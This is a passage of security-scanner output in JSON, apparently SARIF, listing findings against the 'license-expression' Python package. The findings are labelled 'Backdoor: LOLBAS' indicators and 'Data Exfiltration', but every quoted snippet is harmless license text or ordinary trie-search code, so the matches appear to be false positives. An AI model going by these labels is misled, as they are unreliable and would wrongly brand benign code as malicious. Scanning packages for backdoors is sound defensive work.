                    "text": "public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n",
                    "rendered": {
                      "text": "public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n",
                      "markdown": "`public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 39,
                  "endLine": 335,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n",
                    "rendered": {
                      "text": "\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n",
                      "markdown": "`\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 52,
                  "endLine": 120,
                  "endColumn": 56,
                  "snippet": {
                    "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n",
                    "rendered": {
                      "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n",
                      "markdown": "`     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 57,
                  "endLine": 121,
                  "snippet": {
                    "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n",
                    "rendered": {
                      "text": "     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n",
                      "markdown": "`     as reproduction, public display, public performance, distribution,\n     dissemination, communication, or importation, and to make material\n     available to the public including in ways that members of the\n     public may access the material from a place and at a time\n     individually chosen by them.\n\n  j. Sui Generis Database Rights means rights other than copyright\n     resulting from Directive 96/9/EC of the European Parliament and of\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 74,
                  "endLine": 335,
                  "endColumn": 78,
                  "snippet": {
                    "text": "\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n",
                    "rendered": {
                      "text": "\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n",
                      "markdown": "`\n            yielded = False\n\n            # search for a matching token_string in the children, starting at root\n            while token_string not in state.children:\n                state = state.fail\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 74,
                  "endLine": 542,
                  "snippet": {
                    "text": "        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n",
                    "rendered": {
                      "text": "        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n",
                      "markdown": "`        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n        For example:\n        >>> tokens = [Token(0, 0), Token(5, 5), Token(1, 1), Token(2, 4), Token(2, 5)]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 540,
                  "startColumn": 50,
                  "endLine": 540,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                    "rendered": {
                      "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                      "markdown": "`    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 540,
                  "startColumn": 15,
                  "endLine": 540,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                    "rendered": {
                      "text": "    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n",
                      "markdown": "`    def sort(cls, tokens):\n        \"\"\"\n        Return a new sorted sequence of tokens given a sequence of tokens. The\n        primary sort is on start and the secondary sort is on longer lengths.\n        Therefore if two tokens have the same start, the longer token will sort\n        first.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 15,
                  "endLine": 245,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n",
                    "rendered": {
                      "text": "        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n",
                      "markdown": "`        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n            for node in current_node.children.values():\n                queue.append(node)\n                state = current_node.fail\n                while node.token not in state.children:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 44,
                  "endLine": 241,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n",
                    "rendered": {
                      "text": "            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n",
                      "markdown": "`            else:\n                self.root.children[token] = self.root\n\n        # 2. using the queue of all possible top level items/chars, walk the trie and\n        # add failure links to nodes as needed\n        while queue:\n            current_node = queue.popleft()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 15,
                  "endLine": 234,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n",
                    "rendered": {
                      "text": "        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n",
                      "markdown": "`        # And build a queue of these\n        for token in self._known_tokens:\n            if token in self.root.children:\n                node = self.root.children[token]\n                # e.g. f(s) = 0, Aho-Corasick-wise\n                node.fail = self.root\n                queue.append(node)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 7,
                  "endLine": 210,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n",
                    "rendered": {
                      "text": "        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n",
                      "markdown": "`        \"\"\"\n        Return True if the key is present in this trie.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        if node:\n            return bool(node.output != nil)\n        return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 7,
                  "endLine": 159,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n",
                    "rendered": {
                      "text": "        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n",
                      "markdown": "`        (other than nil). If `default` is not provided or is `nil`, raise a\n        KeyError.\n        \"\"\"\n        node = self.__get_node(tokens_string)\n        output = nil\n        if node:\n            output = node.output\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 14,
                  "endLine": 151,
                  "snippet": {
                    "text": "                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n",
                    "rendered": {
                      "text": "                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n",
                      "markdown": "`                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n\n    def get(self, tokens_string, default=nil):\n        \"\"\"\n        Return the output value found associated with a `tokens_string`. If\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 15,
                  "endLine": 147,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n",
                    "rendered": {
                      "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n",
                      "markdown": "`        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                return None\n        return node\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 7,
                  "endLine": 144,
                  "endColumn": 13,
                  "snippet": {
                    "text": "            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                    "rendered": {
                      "text": "            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                      "markdown": "`            return\n\n        tokens = [t for t in get_tokens(tokens_string) if t.strip()]\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 70,
                  "endLine": 137,
                  "endColumn": 76,
                  "snippet": {
                    "text": "    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n",
                    "rendered": {
                      "text": "    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n",
                      "markdown": "`    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n        if not tokens_string or not isinstance(tokens_string, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 16,
                  "endLine": 136,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n",
                    "rendered": {
                      "text": "\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n",
                      "markdown": "`\n    def __get_node(self, tokens_string):\n        \"\"\"\n        Return a node for this tokens_string or None if the trie does not\n        contain the tokens_string. Private function retrieving a final node of\n        the Trie for a given tokens_string.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 15,
                  "endLine": 130,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n",
                    "rendered": {
                      "text": "            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n",
                      "markdown": "`            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 15,
                  "endLine": 126,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n",
                    "rendered": {
                      "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n",
                      "markdown": "`        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 7,
                  "endLine": 123,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                    "rendered": {
                      "text": "\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                      "markdown": "`\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 26,
                  "endLine": 68,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n",
                    "rendered": {
                      "text": "        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n",
                      "markdown": "`        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 70,
                  "endLine": 61,
                  "endColumn": 76,
                  "snippet": {
                    "text": "\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n",
                    "rendered": {
                      "text": "\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n",
                      "markdown": "`\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 3,
                  "endLine": 51,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n",
                    "rendered": {
                      "text": "\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n",
                      "markdown": "`\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 34,
                  "endLine": 340,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n",
                    "rendered": {
                      "text": "                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n",
